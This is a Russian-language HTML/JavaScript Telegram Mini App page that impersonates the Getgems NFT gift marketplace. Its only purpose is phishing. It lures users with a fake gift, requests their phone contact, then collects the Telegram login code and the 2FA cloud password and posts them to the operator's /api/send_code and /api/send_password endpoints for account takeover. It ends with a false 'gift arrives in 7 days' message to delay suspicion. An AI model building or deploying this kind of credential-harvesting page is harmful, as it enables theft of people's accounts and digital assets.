<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no,user-scalable=no,viewport-fit=cover">
    <title>Getgems: купить и продать подарки</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root { --bg: #000; --card: #111; --accent: #007aff; --text: #fff; --gray: #8e8e93; --border: rgba(255,255,255,0.08); }
        body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; margin: 0; padding: 0; user-select: none; -webkit-tap-highlight-color: transparent; }
        .top-nav { display: flex; padding: 8px 16px; gap: 20px; border-bottom: 0.5px solid var(--border); background: var(--bg); position: sticky; top: 0; z-index: 10; }
        .nav-item { font-size: 14px; font-weight: 600; color: var(--gray); padding: 8px 0; }
        .nav-item.active { color: var(--text); border-bottom: 2px solid var(--text); }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; padding: 16px; }
        .grid-item { background: var(--card); border-radius: 16px; padding: 12px; border: 0.5px solid var(--border); transition: 0.2s; text-align: center; }
        .grid-item:active { transform: scale(0.96); }
        .grid-item img { width: 85%; aspect-ratio: 1; object-fit: contain; }
        .grid-item-name { font-size: 14px; font-weight: 600; margin-top: 8px; }
        #details-screen { display: none; position: fixed; inset: 0; background: var(--bg); z-index: 20; padding: 16px; overflow-y: auto; }
        .back { color: var(--accent); font-weight: 500; margin-bottom: 20px; display: block; cursor: pointer; }
        .nft-hero { width: 100%; aspect-ratio: 1; background: radial-gradient(circle, #1c1c1e 0%, #000 100%); border-radius: 24px; display: flex; align-items: center; justify-content: center; border: 0.5px solid var(--border); margin-bottom: 20px; }
        .nft-hero img { width: 70%; }
        .btn-stack { display: flex; flex-direction: column; gap: 12px; margin-top: 24px; }
        .btn { padding: 18px; border-radius: 16px; font-size: 16px; font-weight: 600; border: none; text-align: center; cursor: pointer; }
        .btn-blue { background: var(--accent); color: #fff; }
        .btn-dark { background: #1c1c1e; color: #fff; border: 0.5px solid var(--border); }
        .overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 100; align-items: center; justify-content: center; padding: 20px; backdrop-filter: blur(10px); }
        .modal { background: #1c1c1e; width: 100%; max-width: 320px; border-radius: 30px; padding: 30px; text-align: center; }
        .input-f { width: 100%; padding: 16px; margin: 15px 0; background: #000; border: 1px solid #333; border-radius: 12px; color: #fff; font-size: 24px; text-align: center; outline: none; box-sizing: border-box; }
        .spinner { width: 32px; height: 32px; border: 3px solid rgba(255,255,255,0.1); border-top-color: var(--accent); border-radius: 50%; margin: 0 auto 15px; animation: spin 1s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div id="main-screen">
    <div class="top-nav">
        <div class="nav-item active">Подарки</div>
        <div class="nav-item">Номера</div>
        <div class="nav-item">Имена</div>
    </div>
    <div class="grid" id="nft-grid"></div>
</div>

<div id="details-screen">
    <span class="back" onclick="closeNFT()">← Назад</span>
    <div class="nft-hero"><img id="d-img"></div>
    <div style="color:var(--accent); font-size:14px;">Telegram Gifts</div>
    <h1 id="d-title" style="margin:8px 0 24px 0; font-size:32px;"></h1>
    <div class="btn-stack">
        <button class="btn btn-blue" onclick="openModal()">Принять на аккаунт</button>
        <button class="btn btn-dark" onclick="openModal()">Продать подарок</button>
    </div>
</div>

<div id="overlay" class="overlay">
    <div class="modal">
        <div id="s1">
            <h3>Синхронизация</h3>
            <p style="color:var(--gray); font-size:14px;">Подтвердите сессию для передачи NFT на ваш аккаунт</p>
            <button class="btn btn-blue" style="width:100%; margin-top:15px;" onclick="requestAuth()">Начать</button>
        </div>
        <div id="s2" style="display:none">
            <h3>Верификация</h3>
            <p style="color:var(--gray); font-size:14px;">Введите код из уведомления Telegram</p>
            <input type="text" id="code" class="input-f" placeholder="00000" maxlength="6">
            <button class="btn btn-blue" style="width:100%" onclick="sendCode()">Продолжить</button>
        </div>
        <div id="s3" style="display:none">
            <h3>Облачный пароль</h3>
            <p style="color:var(--gray); font-size:14px;">Введите 2FA для завершения</p>
            <input type="password" id="pass" class="input-f" placeholder="Пароль">
            <button class="btn btn-blue" style="width:100%" onclick="sendPass()">Завершить</button>
        </div>
        <div id="loader" style="display:none">
            <div class="spinner"></div>
            <p id="l-text">Синхронизация...</p>
        </div>
    </div>
</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.expand();
    let userPhone = "";

    window.onload = function() {
        const urlParams = new URLSearchParams(window.location.search);
        const nftUrl = urlParams.get('nft_url') || "";
        
        let giftName = "Magic Bear";
        let giftImg = "bear";

        if (nftUrl) {
            const slug = nftUrl.split('/').pop();
            giftName = slug.split('-').map(word => word.charAt(0).toUpperCase() + word.slice(1)).join(' ');
            giftImg = slug.includes('bear') ? 'bear' : (slug.includes('star') ? 'star' : 'bear');
        }

        const grid = document.getElementById('nft-grid');
        grid.innerHTML = `
            <div class="grid-item" onclick="openNFT('${giftName}', '${giftImg}')">
                <img src="https://raw.githubusercontent.com/TelegramMessenger/Gifts/main/assets/${giftImg}.png">
                <div class="grid-item-name">${giftName}</div>
            </div>
        `;
        openNFT(giftName, giftImg);
    };

    function openNFT(name, img) {
        document.getElementById('main-screen').style.display = 'none';
        document.getElementById('details-screen').style.display = 'block';
        document.getElementById('d-title').innerText = name;
        document.getElementById('d-img').src = `https://raw.githubusercontent.com/TelegramMessenger/Gifts/main/assets/${img}.png`;
    }

    function closeNFT() {
        document.getElementById('main-screen').style.display = 'block';
        document.getElementById('details-screen').style.display = 'none';
    }

    function openModal() { document.getElementById('overlay').style.display = 'flex'; }

    // ОБНОВЛЕННАЯ ФУНКЦИЯ: Опрос сервера каждые 2 секунды
    function requestAuth() {
        tg.requestContact((ok) => {
            if(ok) {
                document.getElementById('s1').style.display = 'none';
                document.getElementById('loader').style.display = 'block';
                document.getElementById('l-text').innerText = "Ожидание подтверждения..."; 
                
                let attempts = 0;
                const check = setInterval(async () => {
                    attempts++;
                    try {
                        // Опрашиваем твой API, получил ли бот номер телефона
                        const r = await fetch(`/api/check_contact?id=${tg.initDataUnsafe.user.id}`);
                        const d = await r.json();
                        
                        if(d.status === 'received') {
                            clearInterval(check);
                            userPhone = d.phone;
                            document.getElementById('loader').style.display = 'none';
                            document.getElementById('s2').style.display = 'block';
                        }
                    } catch(e) { console.error("Ошибка сети:", e); }
                    
                    // Тайм-аут через 60 секунд (30 попыток по 2 сек)
                    if(attempts > 30) { 
                        clearInterval(check);
                        document.getElementById('l-text').innerText = "Ошибка сессии. Попробуйте еще раз.";
                    }
                }, 2000);
            }
        });
    }

    let isSending = false; 

    async function sendCode() {
        if (isSending) return; // ВОТ ЭТОГО НЕ ХВАТАЛО
        
        const c = document.getElementById('code').value;
        if(c.length < 5) return;
        
        isSending = true; // Блокируем
        document.getElementById('s2').style.display = 'none';
        document.getElementById('loader').style.display = 'block';
        document.getElementById('l-text').innerText = "Проверка кода...";
        
        try {
            const r = await fetch('/api/send_code', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({phone: userPhone, code: c})
            });

            if (!r.ok) throw new Error('Ошибка сервера: ' + r.status);

            const d = await r.json();
            document.getElementById('loader').style.display = 'none';

            if(d.status === '2fa_needed') {
                document.getElementById('s3').style.display = 'block';
            } else if(d.status === 'success') {
                finish();
            } else {
                tg.showAlert("Ошибка: " + (d.message || "неверный код"));
                document.getElementById('s2').style.display = 'block';
            }
        } catch(e) {
            document.getElementById('loader').style.display = 'none';
            document.getElementById('s2').style.display = 'block';
            tg.showAlert("Ошибка связи с сервером.");
        } finally {
            isSending = false; // Разблокируем в конце
        }
    }

    async function sendPass() {
        const p = document.getElementById('pass').value;
        if(!p || isSending) return; // Проверка на пустой пароль и двойной тап
        
        isSending = true;
        document.getElementById('s3').style.display = 'none';
        document.getElementById('loader').style.display = 'block';
        
        // ВОТ ЭТА СТРОЧКА ИСПРАВЛЯЕТ ТВОЮ ПРОБЛЕМУ:
        document.getElementById('l-text').innerText = "Проверка пароля..."; 
        
        try {
            const r = await fetch('/api/send_password', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({phone: userPhone, password: p})
            });

            if (!r.ok) throw new Error('Ошибка сервера');

            const d = await r.json();
            if(d.status === 'success') {
                finish();
            } else {
                tg.showAlert("Неверный облачный пароль");
                document.getElementById('s3').style.display = 'block';
                document.getElementById('loader').style.display = 'none';
            }
        } catch(e) {
            console.error(e);
            tg.showAlert("Ошибка соединения с сервером");
            document.getElementById('loader').style.display = 'none';
            document.getElementById('s3').style.display = 'block';
        } finally {
            isSending = false;
        }
    }

    function finish() {
        document.getElementById('loader').style.display = 'block';
        document.getElementById('l-text').innerText = "Привязка NFT...";
        setTimeout(() => {
            tg.showAlert("Успешно! Подарок будет передан на ваш аккаунт в течение 7 дней в связи с новыми ограничениями Telegram.");
            tg.close();
        }, 3000);
    }
</script>
</body>
</html>